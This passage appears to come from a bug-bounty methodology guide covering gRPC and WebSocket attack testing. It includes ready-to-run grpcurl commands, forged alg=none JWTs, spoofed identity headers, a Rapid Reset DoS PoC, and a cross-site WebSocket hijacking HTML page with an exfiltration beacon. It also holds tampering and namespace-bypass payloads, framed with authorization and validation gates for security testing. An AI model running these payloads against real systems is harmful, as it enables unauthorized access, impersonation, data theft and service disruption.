brew install grpcurl   # or: go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# List services — -plaintext for h2c, -insecure for self-signed TLS, plain for valid TLS
grpcurl -plaintext $TARGET:50051 list
grpcurl -insecure  $TARGET:443   list

# Typical output when reflection is on:
#   grpc.reflection.v1.ServerReflection
#   grpc.health.v1.Health
#   user.UserService
#   admin.AdminService
#   payment.PaymentService

# List + describe every method of each service
grpcurl -plaintext $TARGET:50051 list admin.AdminService
grpcurl -plaintext $TARGET:50051 describe admin.AdminService.DeleteUser
grpcurl -plaintext $TARGET:50051 describe .admin.DeleteUserRequest   # message schema

# Dump the whole catalog to triage interesting surfaces
for SVC in $(grpcurl -plaintext $TARGET:50051 list); do
  echo "== $SVC =="; grpcurl -plaintext $TARGET:50051 list "$SVC"
done | tee grpc-catalog.txt
grep -iE 'admin|internal|debug|secret|impersonate|exec|migrate|reset|delete' grpc-catalog.txt
```

**Reflection disabled?** You can still call known methods if you can guess them, or rebuild the descriptor set from a leaked `.proto` (Phase 5) and pass it with `grpcurl -protoset bundle.bin ...`. Reflection-off is a hardening control, not a security boundary.

---

## Phase 3 — Call Methods Without Authentication (authz testing)

```bash
# Baseline: call a sensitive method with NO auth metadata
grpcurl -plaintext $TARGET:50051 -d '{}' admin.AdminService/ListUsers

# IDOR across an enumerable id field
for ID in 1 2 3 100 1000 1001; do
  echo "id=$ID"; grpcurl -plaintext $TARGET:50051 \
    -d "{\"user_id\": $ID}" user.UserService/GetUser 2>&1 | head -4
done
```

**Interpret the gRPC status code, not just whether bytes came back (see Validation):**
- `OK` + populated response → method executed unauthenticated → finding.
- `Unauthenticated (16)` / `PermissionDenied (7)` → authz is enforced; NOT a finding.
- `Unimplemented (12)` → wrong path / method not on this server.
- `InvalidArgument (3)` → reached and parsed your input → method is callable; fix the payload and retry.

---

## Phase 4 — Authentication / Trust-Boundary Bypass

```bash
# (a) Forged bearer / alg=none JWT in the authorization metadata
grpcurl -plaintext $TARGET:50051 \
  -H "authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4iLCJzdWIiOiIxIn0." \
  -d '{}' admin.AdminService/GetConfig

# (b) Backend-trusts-proxy headers: many gRPC backends authenticate at Envoy and
#     then trust identity injected as metadata. If the edge does not STRIP these,
#     spoofing them = full impersonation. Test every plausible name:
for H in "x-user-id: 1" "x-authenticated-user: admin" "x-tenant-id: 0" \
         "x-internal-request: true" "x-forwarded-for: 127.0.0.1" \
         "x-envoy-internal: true" "grpc-internal-encoding-request: true"; do
  echo "== $H =="
  grpcurl -plaintext $TARGET:50051 -H "$H" -d '{}' internal.InternalService/GetSecrets 2>&1 | head -3
done

# (c) Binary metadata smuggling — keys ending in -bin are base64-decoded by the
#     server; some auth middlewares only inspect text metadata, missing -bin keys.
grpcurl -plaintext $TARGET:50051 -H "auth-token-bin: $(printf admin|base64)" \
  -d '{}' admin.AdminService/GetConfig
```

The metadata-stripping bug (b) is the gRPC-specific crown jewel: confirm it by sending the spoofed header **directly to the backend port** AND, separately, **through the public proxy** — if the proxy forwards your `x-user-id` unchanged to the backend, it is exploitable for real users, not just on the bypassed port.

---

## Phase 5 — Proto File / Schema Discovery

```bash
# Proxies (Envoy/grpc-gateway) sometimes serve descriptors or swagger
for P in proto api/proto swagger.json openapiv2 service.swagger.json descriptor.pb; do
  S=$(curl -s -o /dev/null -w '%{http_code}' "https://$TARGET/$P")
  [ "$S" != 404 ] && echo "Found: /$P ($S)"
done

# Source/registry leakage of .proto definitions
gh search code --owner "$TARGET_ORG" 'syntax = "proto3"' --limit 20 2>/dev/null
gh search code --owner "$TARGET_ORG" 'service ' filename:.proto --limit 20 2>/dev/null

# Rebuild a descriptor set from leaked protos and drive the API without reflection
protoc --descriptor_set_out=bundle.bin --include_imports -I proto/ proto/*.proto
grpcurl -protoset bundle.bin -plaintext $TARGET:50051 list
```

Proto leakage on its own is low severity; its value is as the key that unlocks Phases 3–4 against a reflection-disabled target.

---

## Phase 6 — gRPC-Web / grpc-gateway / JSON-Transcoding Attacks

gRPC almost always reaches the browser through a transcoder: **Envoy `grpc_web`/`grpc_json_transcoder`**, **grpc-gateway** (REST↔gRPC), or **Connect**. These translators are the realistic external attack surface and frequently re-expose internal methods.

```bash
# (a) grpc-gateway maps gRPC methods to REST. Reflection-derived method names often
#     map predictably — hit them over plain HTTP/JSON (no gRPC client needed):
curl -s -X POST "https://$TARGET/v1/admin/users:list" -H 'content-type: application/json' -d '{}'
curl -s -X POST "https://$TARGET/admin.AdminService/ListUsers" \
  -H 'content-type: application/json' -d '{}'    # default unannotated route

# (b) Build a real gRPC-Web length-prefixed frame instead of a hand-waved one.
#     Frame = 1-byte flag (0x00=data) + 4-byte big-endian length + protobuf payload.
#     Encode the message with protoscope so the bytes are correct:
#       protoscope -s <<<'1: 1'  > msg.bin          # field 1 (e.g. user_id) = 1
MSG=$(xxd -p msg.bin | tr -d '\n')
LEN=$(printf '%08x' $((${#MSG}/2)))                 # 4-byte length prefix
FRAME=$(printf '00%s%s' "$LEN" "$MSG")
echo "$FRAME" | xxd -r -p > frame.bin
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H 'content-type: application/grpc-web+proto' -H 'x-grpc-web: 1' \
  --data-binary @frame.bin | xxd | head

# (c) grpc-web+json variant (Envoy/Connect) — no manual framing needed:
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H 'content-type: application/grpc-web+json' -H 'x-grpc-web: 1' \
  -d '{"user_id": 1}'

# (d) Connect protocol (buf): plain JSON POST, unary, no framing:
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H 'content-type: application/json' -H 'connect-protocol-version: 1' \
  -d '{"user_id": 1}'
```

Why this matters: the browser-facing transcoder commonly forwards to the SAME backend as the internal gRPC plane. If the transcoder route exposes `AdminService` or fails to require the auth the gRPC client would have sent, you have a real, externally-reachable authz bug. Confirm each transcoded route returns `OK` with sensitive data, and verify it is reachable as an unauthenticated/low-priv user (not just from inside the mesh).

---

## Phase 7 — HTTP/2 Rapid Reset DoS (CVE-2023-44487)

**Authorization gate:** DoS is out of scope on the overwhelming majority of programs. Do NOT run this without explicit, written, scoped permission and a target/window the program owner agreed to. Skip to Validation if unsure.

The attack is NOT a load test. It opens streams (HEADERS) and immediately cancels them (RST_STREAM) before the server finishes, so each cancelled stream frees a `MAX_CONCURRENT_STREAMS` slot instantly while the server still spends work on it — the client races far ahead of the concurrency cap. `h2load`/`ghz` are throughput benchmarkers; **they have no rapid-reset mode and never interleave HEADERS+immediate-RST_STREAM, so they cannot test this.**

**Correct tooling — author-sanctioned PoCs that actually emit the frame pattern:**
```bash
# CERT/CC + community tracking and PoCs for CVE-2023-44487:
#   https://kb.cert.org/vuls/id/421644
#   https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/  (Cloudflare writeup)
# Go PoC that sends HEADERS then immediate RST_STREAM in a tight loop:
git clone https://github.com/secengjeff/rapidresetclient
cd rapidresetclient && go build -o rapidreset .
# Detection-only: a SHORT, low-count burst, with permission, then STOP:
./rapidreset --help    # confirm current flags first, then a SMALL authorized burst, e.g.:
# ./rapidreset -url https://$TARGET:443 -concurrency 1 -requests 20

# If you must roll your own, use the h2 framing layer (golang.org/x/net/http2)
# to write a HEADERS frame immediately followed by RST_STREAM(CANCEL) per stream id.
```

**Detection without DoSing — prefer this:** the only thing you need to PROVE is whether mitigations are present. Check the server banner / version and whether it tracks reset floods:
```bash
# Fingerprint the HTTP/2 implementation and version (patched versions are known):
curl -sI --http2 https://$TARGET/ | grep -i '^server:'
# nghttp2 >=1.57.0, Go net/http with the 2023-10 fix, Envoy >=1.27.1/1.26.5/1.25.10/1.24.11,
# grpc-go >=1.56.3/1.57.1/1.58.3 are mitigated. Version-match instead of flooding.
```
Report the *version-confirmed* mitigation gap rather than a benchmark slowdown. "Server got slower under load" is not proof of CVE-2023-44487 — it produces false positives on slow/under-provisioned servers and false negatives on patched ones that throttle resets gracefully.

---

## Tools

```bash
grpcurl   # primary CLI client (list/describe/call, -protoset for reflection-off)
grpcui    # web UI for interactive exploration:  grpcui -plaintext $TARGET:50051
protoc + protoscope   # build/inspect raw protobuf and gRPC-Web frames (Phase 6)
buf       # lint/inspect proto, drive Connect endpoints
# DoS-only, AUTHORIZED engagements: secengjeff/rapidresetclient (true rapid-reset PoC).
#   NOTE: ghz and h2load are LOAD benchmarkers, NOT rapid-reset testers — do not
#   use them to "prove" CVE-2023-44487.
```

---

## Chain Table

| gRPC finding | Chain to | Impact |
|--------------|----------|--------|
| Reflection enabled | Enumerate all internal service methods + messages | Full API catalog disclosure (enabler) |
| Admin method, no auth | Call privileged RPCs (`DeleteUser`, `GetConfig`) | Data manipulation / system access — Critical |
| Proxy forwards `x-user-id`/`x-tenant-id` unstripped | Spoof identity metadata → cross-tenant impersonation | Tenant isolation bypass — Critical |
| IDOR via enumerable id field | Iterate `user_id` over `GetUser` | Mass PII exfil — High |
| grpc-gateway / gRPC-Web route re-exposes internal RPC | Hit transcoded REST/JSON path unauth | Externally-reachable authz bypass — High/Critical |
| Plaintext h2c on internal port | MITM / sniff metadata (bearer tokens) | Credential capture — High |
| `.proto` leak (repo/swagger) | `-protoset` to drive reflection-off target | Unlocks Phases 3–4 — Low alone, High as enabler |

Related skills: **hunt-idor** (id enumeration logic), **hunt-api-misconfig** (JWT alg=none / mass-assignment in request messages), **hunt-auth-bypass** (edge-vs-backend trust boundary), **hunt-tls-network** (h2c/plaintext + ALPN), **cloud-iam-deep** (if a called RPC returns cloud creds).

---

## Validation — false-positive discipline

gRPC's failure modes look like successes to a naive `grep`. Apply these gates before any submission.

1. **Status-code discrimination, not byte-counting.** A non-empty response can still be an error frame. Confirm the `grpc-status` trailer is `0` (OK). `Unauthenticated (16)` / `PermissionDenied (7)` mean auth WORKS — close the candidate. `Unimplemented (12)` means you have the wrong method. Re-run with `grpcurl -v` and read the trailers explicitly.

2. **Reflection / health endpoints are often intentionally public.** `grpc.reflection.*` and `grpc.health.v1.Health` being reachable is, by itself, **info disclosure (Low/Medium at most)** — many vendors ship reflection on by design. Do NOT report it as "missing auth" unless it leaks a non-public service catalog. The finding is the *sensitive* service you can then call without auth, proven in Phase 3.

3. **Distinguish "no auth" from "auth not required for THIS method."** Some methods (health, public catalog reads) are legitimately anonymous. Prove the bug by showing an authenticated-vs-unauthenticated **state delta**: the same RPC returns another user's/tenant's private data without credentials, or a mutating admin RPC executes (re-read the changed state to confirm side-effect).

4. **Proxy-vs-backend reachability.** A bug reachable only by hitting an internal `:50051` you found via SSRF/port-scan is real but its severity depends on reachability. State explicitly how an external attacker reaches it (exposed port, SSRF egress, proxy passthrough). For metadata-spoofing, prove the PUBLIC proxy forwards the spoofed header — not just the bypassed backend port.

5. **OOB / Collaborator for anything blind.** If an RPC takes a URL/host argument (webhook, import, render), it is an SSRF candidate: point it at a Burp Collaborator payload with a unique subdomain and confirm the DNS+HTTP interaction before claiming SSRF. No interaction = no SSRF. Hand off to **hunt-ssrf**.

6. **DoS is authorization-gated and version-verifiable.** Never submit CVE-2023-44487 off a benchmark "slowdown." Either (a) version-match an unpatched HTTP/2 stack from the `server:` banner, or (b) demonstrate the reset-flood ONLY under explicit written authorization with an agreed window — then stop immediately. A slow response is not proof.

**Severity guide (after the gates above pass):**
- Sensitive/admin RPC callable with no auth, side-effect proven → **Critical**
- Proxy-forwarded metadata spoofing → cross-tenant impersonation → **Critical**
- IDOR / mass PII via enumerable RPC → **High**
- Internal service externally reachable (transcoder or open port) → **High**
- Plaintext h2c leaking bearer metadata → **High**
- Reflection enabled exposing non-public catalog → **Medium** (enabler)
- Proto/descriptor leak, no callable sensitive method → **Low**




---

## websocket

# HUNT-WEBSOCKET — WebSocket Security

## Crown Jewel Targets

CSWSH (Cross-Site WebSocket Hijacking) with a cookie-authenticated handshake and no CSRF/per-connection token = High–Critical (real-time exfil of any logged-in victim's data).

**Highest-value chains:**
- **CSWSH → data exfil / ATO** — handshake authenticates via ambient cookie, no CSRF token, Origin not enforced → attacker page opens WS as the victim and streams their messages/PII/tokens. If the stream carries a session/refresh/CSRF token, this escalates to ATO.
- **No per-message auth** — HTTP/handshake auth present but individual WS frames are not re-authorized → privileged messages accepted (`deleteUser`, `getSecretConfig`).
- **Message tampering** — modify in-flight frames (price, qty, userId, amount) in trading/game/checkout apps → financial fraud.
- **socket.io namespace / room authz bypass** — connect to a privileged namespace or join another user's room without a permission check → cross-tenant real-time exfil.
- **Handshake-layer Upgrade smuggling** — a malformed `Upgrade`/`Connection`/`Sec-WebSocket-*` handshake makes the front proxy and origin disagree on whether an upgrade occurred → request-smuggling tunnel.

---

## Grounding — Reference Cases (read before hunting)

These are public, verifiable references. Use them to calibrate what a *real* WS finding looks like and how it was proven. Do not invent additional report IDs or payouts.

| # | Source / ID | Class | Lesson |
|---|-------------|-------|--------|
| 1 | PortSwigger Web Security Academy — "Cross-site WebSocket hijacking" (research + labs) | CSWSH | Canonical CSWSH model: cookie-auth handshake + no CSRF token + missing Origin check → attacker reads/sends as victim. The authoritative methodology. |
| 2 | Christian Schneider — "Cross-Site WebSocket Hijacking (CSWSH)" (original disclosure/write-up, 2013) | CSWSH | First public CSWSH technique: cookie-auth handshake + no Origin enforcement; PoC must prove victim-data receipt in the attacker browser, not just a 101. |
| 3 | Coda CSWSH (referenced in this repo's hunt-csrf set) | CSWSH | Real-time collab apps commonly authenticate the socket purely via cookie; Origin allow-listing was the missing control. |
| 4 | CVE-2020-7662 — `websocket-extensions` (Node) ReDoS | DoS | A crafted `Sec-WebSocket-Extensions` header triggers catastrophic backtracking — handshake header is an attack surface, not just frames. |
| 5 | CVE-2024-37890 — `ws` (Node) DoS | DoS | Many handshake request headers exhaust the server; confirms the handshake itself is parser-attackable pre-frames. |
| 6 | Outdated `socket.io` / Engine.IO stacks | socket.io | Motivates the version-fingerprint step in Phase 7 — fingerprint the version, then check that release's known advisories. |

> Only the four CVEs above are asserted with exact IDs because they are verifiable. For any case where you are not certain of the exact identifier, describe the technique with **no** citation — a wrong CVE is worse than none.

---

## Phase 1 — Discover WebSocket Endpoints

```bash
# Grep JS for WS connections (handshake URLs, socket.io clients)
grep -rE "new WebSocket|io\(|io\.connect|socket\.io|new SockJS|signalr|Phoenix\.Socket|wss?://" \
  recon/$TARGET/ --include="*.js" 2>/dev/null | \
  grep -oE "(wss?://[^'\"]+|/[a-zA-Z0-9/_.-]*socket[^'\"]*|/signalr[^'\"]*|/cable\b)" | sort -u

# Crawl URLs for realtime hints
grep -iE "socket|/ws\b|websocket|stream|realtime|live|chat|events|/cable|/signalr|notifications" \
  recon/$TARGET/urls.txt | sort -u

# Probe handshake (101 = upgrade supported)
curl -sI -o /dev/null -w "%{http_code}\n" \
  -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: $(head -c16 /dev/urandom | base64)" \
  "https://$TARGET/ws"

# socket.io polling handshake leaks version + sid
curl -s "https://$TARGET/socket.io/?EIO=4&transport=polling" | head -c 300; echo

# Non-standard WS ports
nmap -sV -p 80,443,3000,3001,8080,8443,8888,9000 $TARGET 2>/dev/null | grep open
```

In Burp Pro, use `get_proxy_websocket_history` (and the WebSockets tab) after browsing the app to enumerate live sockets, message schemas, and which frames carry auth-sensitive data.

---

## Phase 2 — CSWSH (Cross-Site WebSocket Hijacking)

CSWSH requires THREE conditions together: (a) the handshake authenticates via an **ambient credential** (cookie sent automatically), (b) there is **no unpredictable per-connection token** in the handshake (no CSRF token / no token in URL/body), and (c) the server **does not enforce Origin**. Missing any one breaks the attack.

```bash
# Step 1 — Confirm handshake auth model in DevTools → Network → WS → Headers.
#   Look for: Cookie: session=...  AND  the ABSENCE of any per-request token
#   (no ?token=, no Sec-WebSocket-Protocol carrying a bearer, no body nonce).
#   If a unique token rides the handshake, CSWSH is NOT exploitable cross-site.

# Step 2 — Probe Origin enforcement (this is a SIGNAL, not a confirmation)
wscat -c "wss://$TARGET/ws" \
  --header "Origin: https://evil.com" \
  --header "Cookie: session=YOUR_SESSION"
# A 101 from a foreign Origin only proves the handshake opened.
# It does NOT confirm CSWSH — the server may still validate Origin at the
# message layer, refuse to stream authenticated data, or require a token
# in the first app-level frame. Treat 101 as "candidate", move to Step 3.
```

```html
<!-- Step 3 — Real PoC: host on attacker origin, open while a SEPARATE victim
     account is logged into TARGET in the same browser. The bug is only
     confirmed if attacker JS RECEIVES the victim's data (or successfully
     sends a privileged frame). Cross-origin JS cannot set Origin/Cookie —
     the browser does, which is exactly the threat model. -->
<html><body><pre id="out"></pre><script>
var marker = "CSWSH-" + Math.random().toString(36).slice(2);   // unique per run
var ws = new WebSocket("wss://TARGET/ws");                     // attacker cannot forge Origin
ws.onopen = () => {
  log("[+] 101 opened from attacker origin");
  ws.send(JSON.stringify({type:"subscribe", channel:"user_notifications", _m:marker}));
};
ws.onmessage = e => {
  log("VICTIM-DATA: " + e.data);
  // Exfil PROOF to your Collaborator/listener so receipt is logged out-of-band:
  // navigator.sendBeacon("https://<collab-id>.oastify.com/cswsh?d=" + encodeURIComponent(e.data));
};
ws.onerror = e => log("ERR (likely Origin/auth rejected at message layer)");
function log(s){document.getElementById("out").textContent += s + "\n";}
</script></body></html>
```

**False-positive killers:**
- A completed `101` from `Origin: evil.com` is NOT a finding. Many servers accept the upgrade and then send nothing, or close on the first authenticated frame.
- Verify the data you receive belongs to a **different account** than the attacker, using a unique marker / distinct victim PII you planted in account B.
- Exfil the received payload to **Burp Collaborator / an OAST listener** so receipt is recorded out-of-band — this is your impact proof for the report.
- If a per-connection token rides the handshake (in the URL, a sub-protocol, or the first frame), CSWSH is **not** cross-site exploitable; downgrade or drop.

---

## Phase 3 — Missing / Weak Authentication on WS Messages

Handshake auth ≠ per-message auth. Apps often authenticate the socket once, then trust every subsequent frame.

```bash
# No cookie at all — does the server process app frames?
wscat -c "wss://$TARGET/ws"
# > {"type":"getUserData","userId":1}
# > {"type":"getAdminPanel"}

# Low-priv session sending high-priv actions
wscat -c "wss://$TARGET/ws" --header "Cookie: session=LOW_PRIV_SESSION"
# > {"action":"deleteUser","userId":999}
# > {"action":"getSecretConfig"}
```

**Validate:** the privileged action must produce a real effect (a deleted test user, returned secret config, a state change visible via a second channel) — a frame that is *accepted and silently ignored* is not a finding. Re-run as an unauthenticated client to confirm the action is not simply broadcast to everyone harmlessly.

### Replay of Signed Messages
If messages carry signatures (e.g., `{"type":"payment","amount":100,"signature":"..."}`), test replay for freshness and session binding. Capture a signed message and test: (a) **time-window bypass**: replay the message after its expiry timestamp (clock skew/validation gap), (b) **session bypass**: capture a signed message from user A's session and replay it in user B's session — if accepted, the signature was not bound to the user/session ID. Use Burp Repeater to store and replay signed frames, or reconstruct the same message in `wscat` after a time window has passed.

### Business Logic Abuse: State Machine Bypass & Rate Limit Evasion
Stateful protocols (e.g., a trading platform expecting `connect → authenticate → verify_balance → place_order`) may accept messages out of order or skip prerequisites. Test: (a) **state skip**: connect and immediately send `place_order` without `authenticate` or `verify_balance` first — many stacks don't enforce strict ordering if individual message validation is missing, (b) **high-frequency spam**: send identical or high-volume messages rapidly to bypass WS-layer rate limits (different from HTTP rate limits) — test 100s of messages/second to see if the server throttles, returns 429, or closes the connection. If it accepts and processes all, this can abuse business logic (e.g., many small payments to bypass amount caps, or rapid subscriptions to exhaust resources).

---

## Phase 4 — Message Tampering (Financial / Game / Checkout)

```bash
# Intercept + edit in Burp (Proxy → WebSockets history → right-click → Send to
# Repeater, or edit-and-forward). Try server-trusted client values:
#   {"price":100}      -> {"price":0.01}
#   {"amount":1}       -> {"amount":9999}
#   {"userId":123}     -> {"userId":1}        # impersonate admin
#   {"orderTotal":...} -> recompute downstream?

# wscat replay of a tampered frame
wscat -c "wss://$TARGET/trade" --header "Cookie: session=SESSION"
# > {"action":"buy","amount":1,"price":0.01}
```

**Validate:** the tampered value must persist server-side — confirm via the REST/order API or a fresh socket that the order/balance/price actually reflects the manipulation. Many UIs echo your own frame back optimistically; that echo is NOT proof. Demonstrate financial/state impact, ideally on a sandbox/test instrument.

---

## Phase 5 — socket.io / SignalR / Phoenix Namespace & Room Authz Bypass

Engine.IO/socket.io is a protocol layered over the raw WebSocket. Packet prefixes (Engine.IO `4`=MESSAGE wrapping socket.io `0`=CONNECT, `1`=DISCONNECT, `2`=EVENT) carry namespace/room intent. Authorization must be checked when joining; often it isn't.

```bash
# 1) Open the raw socket.io WebSocket (Engine.IO v4)
wscat -c "wss://$TARGET/socket.io/?EIO=4&transport=websocket" \
  --header "Cookie: session=YOUR_SESSION"

# 2) Respond to the server's Engine.IO OPEN ('0{...}') so the connection lives,
#    then CONNECT to a namespace with a socket.io CONNECT packet.
#    CORRECT packet to join the /admin namespace:  40/admin,
#       4 = Engine.IO MESSAGE,  0 = socket.io CONNECT,  /admin, = namespace
#    (NOT a ?nsp= query param — see Phase 7. NOT 42 — 42 is MESSAGE+EVENT.)
# > 40/admin,
#    Server replies 40/admin,{"sid":"..."} on success, or 44/admin,{...} (error)
#    on rejection. A 40 success to a privileged namespace as a low/no-priv
#    user is the bug.

# 3) Once in a namespace, emit an EVENT (42) to join another user's room:
# > 42/admin,["join",{"room":"user_999_private"}]
# > 42["subscribe",{"channel":"admin_events"}]      # root namespace
#    Watch for 42 EVENT frames carrying ANOTHER user's data.
```

**Validate:** distinguish *connected to namespace* from *received privileged data*. The finding is confirmed only when you receive `42` event frames containing data belonging to a different tenant/user, or a privileged emit produces a verifiable server-side effect. A `40/admin` ack with no subsequent data may just be an open-but-empty namespace.

> SignalR analogue: negotiate at `/<hub>/negotiate`, then connect and `Invoke`/`Send` hub methods — test method-level authorization. Phoenix Channels: `phx_join` to `topic:subtopic` and check whether the server's `join/3` authorizes the topic.

---

## Phase 6 — Handshake-Layer Upgrade Smuggling (NOT frame smuggling)

Important: once a WebSocket is established, your payloads are wrapped in WS frames and are **never re-parsed as HTTP** by the proxy. Typing `GET /admin HTTP/1.1` into an open `wscat` session does nothing. WebSocket-related smuggling lives at the **handshake**, before any frames exist.

The real technique: send a WebSocket Upgrade request that the **front proxy** and the **origin** interpret differently — e.g. a bad `Sec-WebSocket-Version` that makes the origin reply `426 Upgrade Required` (or `400`) while the proxy has already decided the connection is "upgraded" and stops parsing HTTP. The proxy then tunnels subsequent bytes straight to the origin as an opaque stream, letting you smuggle arbitrary HTTP requests past front-end controls (WAF/authz).

```bash
# Detection is HTTP-layer, not frame-layer. Use Burp Repeater / send_http1_request
# and toggle ONE handshake variable at a time, comparing front-vs-origin behavior:

#  A) Valid-looking upgrade but unsupported version:
#     Upgrade: websocket
#     Connection: Upgrade
#     Sec-WebSocket-Version: 777          <- origin should 426; does the proxy still tunnel?
#     Sec-WebSocket-Key: <16-byte base64>

#  B) Upgrade header present but Connection: keep-alive (mismatch)
#  C) Smuggled second request body after a "successful" 101, then send a normal
#     follow-up request on the same connection and watch for a desynced response.
```

Drive this with Burp Pro's **HTTP Request Smuggler** extension (it has WebSocket-upgrade test cases) rather than by hand. **Validate** exactly like classic smuggling: prove desync via a timing/differential probe AND show real impact (reach an internal/forbidden path, poison a cached response, or capture another user's request) — confirmed against **Burp Collaborator / OAST**, never on a single ambiguous response.

---

## Phase 7 — socket.io / Engine.IO Specifics

```bash
# Version + initial sid (handshake JSON after the leading Engine.IO digit)
curl -s "https://$TARGET/socket.io/?EIO=4&transport=polling" | head -c 300; echo
# Old/EOL socket.io stacks have known issues — fingerprint the version, then check that release's advisories;
# fingerprint the client lib version from JS bundles too.

# Namespace selection is a PROTOCOL message, not a URL param.
#   WRONG:  wscat -c "wss://$TARGET/socket.io/?EIO=4&transport=websocket&nsp=/admin"
#           ^ `nsp` is NOT a recognized socket.io query param. It is silently
#             ignored and you connect to the ROOT namespace "/". You will believe
#             you tested /admin when you did not.
#   RIGHT:  open the socket, then send the CONNECT packet  40/admin,  (Phase 5).

# Forged/replayed sid against the polling transport (session fixation / hijack probe)
curl -s "https://$TARGET/socket.io/?EIO=4&transport=polling&sid=FAKE_OR_VICTIM_SID"
#   400 "Session ID unknown" = good. A 200 that resumes another sid's stream = bug.
```

---

## Tools

```bash
npm install -g wscat                 # CLI WS client (raw + socket.io)
brew install websocat                # alt client; supports text/binary + autoreconnect
# Burp Suite Pro: WebSockets history (intercept/edit/replay), HTTP Request
#   Smuggler extension (handshake-upgrade smuggling), Collaborator for OAST proof.
# Burp MCP: get_proxy_websocket_history / get_proxy_websocket_history_regex to
#   enumerate frames; generate_collaborator_payload + get_collaborator_interactions
#   to prove out-of-band receipt from a CSWSH/smuggling PoC.
```

---

## Chain Table

| WS finding | Chain to | Impact |
|-----------|----------|--------|
| CSWSH + token in stream | Steal session/refresh/CSRF token from victim frames | ATO (Critical) |
| CSWSH confirmed | Subscribe to victim channels, exfil to OAST | Real-time data theft (High) |
| No per-message auth | Send admin/privileged frames | Privilege escalation (Critical) |
| Message tampering | Modify price/amount/userId, confirm server-side | Financial fraud (Critical) |
| Namespace/room authz bypass | Join other tenant's room, read `42` events | Cross-tenant exfil (High) |
| Handshake Upgrade smuggling | Tunnel HTTP past WAF/authz, OAST-confirmed | Smuggling → SSRF/cache poison (High–Critical) |

---

## Validation (mandatory before reporting)

- ✅ **CSWSH:** attacker-origin PoC HTML, opened with a *different* victim account logged in, must **receive that victim's data** (verified by a unique planted marker / distinct PII) and exfil it to **Collaborator/OAST**. A bare `101` from a foreign Origin is NOT a finding.
- ✅ **No per-message auth:** privileged frame produces a **verifiable server-side effect** (state change confirmed via a second channel / REST API), not merely "accepted".
- ✅ **Message tampering:** tampered value **persists server-side** (confirmed via order/balance API), not just echoed in the UI.
- ✅ **Namespace/room bypass:** received **`42` event frames with another user's data**, not just a `40` namespace ack.
- ✅ **Upgrade smuggling:** desync proven by timing/differential probe **and** real-world impact, **OAST-confirmed**. No single-response guesses.
- ❌ Reject: a 101 alone, an accepted-but-ignored frame, a self-echoed message, a connected-but-empty namespace, or any "confirmed" claim lacking out-of-band/cross-account proof.

**Severity:**
- CSWSH leaking session/refresh token → ATO: **Critical**
- CSWSH → real-time session-data theft: **High**
- No auth on admin/privileged WS actions: **Critical**
- Financial message tampering (server-confirmed): **Critical**
- Namespace/room subscription bypass (cross-tenant): **High**



